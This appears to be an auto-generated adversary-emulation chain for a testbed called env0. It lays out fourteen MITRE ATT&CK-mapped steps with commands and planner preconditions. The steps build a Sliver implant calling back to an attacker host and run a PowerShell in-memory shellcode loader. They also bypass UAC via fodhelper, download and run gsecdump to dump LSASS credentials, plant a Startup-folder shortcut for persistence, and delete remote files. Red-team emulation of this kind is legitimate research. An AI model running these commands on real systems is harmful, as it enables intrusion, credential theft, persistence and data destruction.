# Chain 051

**Testbed**: `env0` · **Steps**: 14 · **Tactics touched**: Command and Control, Initial Access, Execution, Defense Evasion, Discovery, Privilege Escalation, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Initial Access | T1566.002 |
| Execution | T1059.001, T1620 |
| Defense Evasion | T1059.001, T1620, T1548.002, T1070.004, T1485 |
| Discovery | T1012 |
| Privilege Escalation | T1548.002 |
| Credential Access | T1003 |
| Persistence | T1547.001 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build Shellcode for the Sliver implant (for Windows) | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution, Defense Evasion | T1059.001, T1620 | Simulate the victim executes a shellcode payload (Windows) | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1012 | Registry Key Read Operation | Sliver Executor |
| 6 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 7 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 8 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 9 | Privilege Escalation, Defense Evasion | T1548.002 | Bypass UAC using Fodhelper - PowerShell | Powershell Executor |
| 10 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 11 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 12 | Credential Access | T1003 | Gsecdump | Powershell Executor |
| 13 | Persistence | T1547.001 | Add Executable Shortcut Link to User Startup Folder | Powershell Executor |
| 14 | Defense Evasion, Impact | T1070.004, T1485 | Remove Remote Path | Sliver Executor |

## Attack Steps (Detail)

### Step 1 — Build Shellcode for the Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-shellcode`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(shellcode-payload ?p - payload ?s - shellcode)`
- `(file-payload ?p - payload ?file - file)`
- `(bin-file ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim executes a shellcode payload (Windows)

- **UUID**: `simulate-execute-shellcode-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution, Defense Evasion
- **MITRE ID(s)**: T1059.001, T1620
- **Technique(s)**: Command and Scripting Interpreter: PowerShell, Reflective Code Loading

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, open a powershell and execute these scripts)

$s=[System.IO.File]::ReadAllBytes('#{SAVE_PATH}');
$c='using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};
$p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);
$h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `SAVE_PATH` | Saved path of the downloaded shellcode payload file | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(bin-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Registry Key Read Operation

- **UUID**: `sliver-registry_read`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Discovery
- **MITRE ID(s)**: T1012
- **Technique(s)**: Query Registry

**Description**

The `registry_read` command retrieves values from Windows registry.

**Execution** (Sliver Executor)

```
registry_read(session_id=#{executor}, hive=#{hive}, reg_path=#{reg_path}, key=#{key}, hostname=#{hostname})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `hive` | Registry hive (HKLM/HKCU/HKU) | — | yes |
| `reg_path` | Path to registry key | — | yes |
| `key` | Specific value name to read | — | yes |
| `hostname` | Target hostname for remote registry access | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(query-registry-info-known ?target - host)`

---

### Step 6 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 7 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 8 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 9 — Bypass UAC using Fodhelper - PowerShell

- **UUID**: `art-t1548_002-fodhelper-uac-bypass-ps`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Privilege Escalation, Defense Evasion
- **MITRE ID(s)**: T1548.002
- **Technique(s)**: Abuse Elevation Control Mechanism: Bypass User Account Control

**Description**

Uses `fodhelper.exe` — a Windows built-in auto-elevating binary in `System32` — to run a pre-staged executable at elevated integrity while bypassing the UAC prompt. Technique: seed `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with the executable path; launching `fodhelper.exe` reads that key and executes the value elevated because `fodhelper.exe` carries `autoElevate=true` in its manifest. Requires the current interactive user to be a member of the local Administrators group; running in Medium Integrity is fine — that is the point. ART auto_generated_guid 4ff64f0b-aaf2-4866-b39d-38d9791407cc.

Realistic chain: fodhelper is used to re-launch a pre-staged payload at higher integrity, giving downstream `execute-meterpreter-payload-file` (or the sliver equivalent) a `(file-executed-elevated)` on the payload file — which promotes the derived session to `(elevated-executor)` via that consumer's conditional effect. The default `C:\Windows\System32\cmd.exe` is a benign, always-present binary suitable for interactive testing of the technique itself.

Modelling note: this action is parametric in what *file* runs elevated. AALM does not yet express "run an arbitrary Windows command elevated" as a first-class predicate — that is a deliberate post-2.0 refactor. For any elevated-command chain the operator wants that isn't a pre-staged exe, wrap the command in a `.exe` (or `.bat` invoked via cmd.exe) upstream and point this action at that file.

**Execution** (Powershell Executor)

```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "#{EXE_PATH}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID (unelevated, admin-group user) used to invoke the UAC-bypass sequence. | — | yes |
| `EXE_PATH` | Path of the executable on the victim host that fodhelper will run with elevated integrity. Common chain use is to point at a pre-staged Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command prompt — useful for interactive testing of the bypass itself. | C:\\Windows\\System32\\cmd.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 10 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 11 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 12 — Gsecdump

- **UUID**: `art-t1003-gsecdump-lsass`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003
- **Technique(s)**: OS Credential Dumping

**Description**

Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
action itself stages the binary from web.archive.org with SHA256
verification if not already present, then runs `gsecdump -a`. Precondition
is just a powershell session; no marker predicate for the binary. ART
auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.

**Execution** (Powershell Executor)

```
if (-not (Test-Path "#{gsecdump_exe}")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $parentpath = Split-Path "#{gsecdump_exe}"
  $binpath = "$parentpath\gsecdump-v2b5.exe"
  New-Item -ItemType Directory $parentpath -Force | Out-Null
  IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
  if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
    Move-Item $binpath "#{gsecdump_exe}"
  }
}
& "#{gsecdump_exe}" -a
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke the prereq + main command. | — | yes |
| `gsecdump_exe` | Local path on target where gsecdump binary should be staged and run. | C:\\Users\\Public\\gsecdump.exe | yes |
| `gsecdump_url` | Download URL for the gsecdump-v2b5 binary (web archive). | https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe | yes |
| `gsecdump_bin_hash` | Expected SHA256 of the gsecdump-v2b5.exe binary. | 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 13 — Add Executable Shortcut Link to User Startup Folder

- **UUID**: `art-t1547_001-startup-folder-lnk`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

File-based Startup persistence: creates a `.lnk` shortcut in the
current user's `Startup` folder pointing at the chosen executable.
Native Windows shell (WScript.Shell) — no external binary. Original
ART test hardcodes calc.exe as the target; parameterised here so
operators can substitute a real payload. ART auto_generated_guid
24e55612-85f6-4bd6-ae74-a73d02e3441d.

**Execution** (Powershell Executor)

```
$Target = "#{target_path}"
$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\#{shortcut_name}"
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to create the .lnk file. | — | yes |
| `target_path` | Full path to the executable the shortcut launches at login. | C:\\Windows\\System32\\calc.exe | yes |
| `shortcut_name` | Filename of the .lnk placed under the Startup folder. | ArtPersist.lnk | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 14 — Remove Remote Path

- **UUID**: `sliver-rm`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: Indicator Removal: File Deletion
, Data Destruction

**Description**

The `rm(remote_path, recursive=False, force=False)` command removes a directory or file(s) from the remote system. Parameters include remote_path (remote path), recursive (recursively remove file(s)), and force (forcefully remove the file(s)).

**Execution** (Sliver Executor)

```
rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `RemotePath` | Remote path | — | yes |
| `Recursive` | Recursively remove file(s) | — | yes |
| `Force` | Forcefully remove the file(s) | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
